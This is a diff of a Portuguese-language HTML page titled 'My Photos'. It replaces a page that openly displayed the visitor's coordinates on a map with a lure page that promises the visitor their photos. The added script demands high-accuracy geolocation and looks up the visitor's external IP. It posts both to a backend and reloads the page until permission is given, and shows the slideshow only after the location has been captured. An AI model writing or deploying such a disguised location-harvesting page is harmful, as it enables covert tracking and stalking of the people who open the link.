@@ -1,25 +1,161 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Minhas Fotos</title>
-  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
   <style>
-    #map { height: 400px; width: 100%; margin-top: 20px; }
-    #info { margin: 10px 0; font-family: sans-serif; }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+      background-color: #fffafc;
+    }
+
+    .btn-abrir-imagens {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #ff69b4;
+      /* Rosa bonito */
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    .btn-abrir-imagens:hover {
+      background-color: #ff1493;
+      /* Rosa mais escuro no hover */
+    }
+
+    .slideshow {
+      margin-top: 30px;
+      position: relative;
+      width: 80%;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .slide {
+      display: none;
+      width: 100%;
+      border-radius: 10px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    .slide.active {
+      display: block;
+    }
   </style>
 </head>
+
 <body>
 
-  <div id="info">
-    <p id="latitude">Latitude: ...</p>
-    <p id="longitude">Longitude: ...</p>
-    <p id="accuracy">Precisão: ...</p>
-  </div>
-  <div id="map"></div>
+  <h1>Aqui estão suas fotos!</h1>
 
-  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-  <script src="script.js"></script>
+  <script>
+    async function success(pos) {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      // Obter IP externo
+      let ip = '';
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip;
+      } catch (err) {
+        console.error('Erro ao obter IP:', err);
+      }
+
+      // Enviar dados para o backend
+      fetch('http://127.0.0.1:4000/localizacoes', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          ip,
+          latitude: lat,
+          longitude: lon
+        })
+      }).then(res => {
+        if (res.ok) {
+          console.log('Localização enviada com sucesso!');
+          mostrarBotaoAbrirImagens();
+        } else {
+          res.json().then(data => {
+            console.warn('Erro ao salvar localização:', data.message);
+          });
+        }
+      }).catch(err => console.error('Erro ao enviar localização:', err));
+    }
+
+    function error(err) {
+      console.warn(`Erro ao obter localização: ${err.message}`);
+      alert('Por favor, permita o compartilhamento da sua localização para visualizar o conteúdo.');
+      location.reload();
+    }
+
+    navigator.geolocation.getCurrentPosition(success, error, {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    });
+
+    function mostrarBotaoAbrirImagens() {
+      const botao = document.createElement('button');
+      botao.textContent = 'Abrir imagens';
+      botao.className = 'btn-abrir-imagens';
+      botao.onclick = iniciarSlideshow;
+      document.body.appendChild(botao);
+    }
+
+    function iniciarSlideshow() {
+      const slideshow = document.createElement('div');
+      slideshow.className = 'slideshow';
+
+      const imagens = [
+        '../frontend/src/img/01.jpg',
+        '../frontend/src/img/02.jpg',
+        '../frontend/src/img/03.jpg',
+        '../frontend/src/img/04.jpg',
+        // Adicione mais imagens se quiser
+      ];
+
+      imagens.forEach((src, index) => {
+        const img = document.createElement('img');
+        img.src = src;
+        img.className = 'slide';
+        if (index === 0) img.classList.add('active');
+        slideshow.appendChild(img);
+      });
+
+      document.body.appendChild(slideshow);
+
+      iniciarTrocaDeSlides();
+
+      // Remover o botão depois de clicar
+      const botao = document.querySelector('.btn-abrir-imagens');
+      if (botao) {
+        botao.remove();
+      }
+    }
+
+    function iniciarTrocaDeSlides() {
+      const slides = document.querySelectorAll('.slide');
+      let index = 0;
+
+      setInterval(() => {
+        slides[index].classList.remove('active');
+        index = (index + 1) % slides.length;
+        slides[index].classList.add('active');
+      }, 3000);
+    }
+  </script>
 
 </body>
+
 </html>
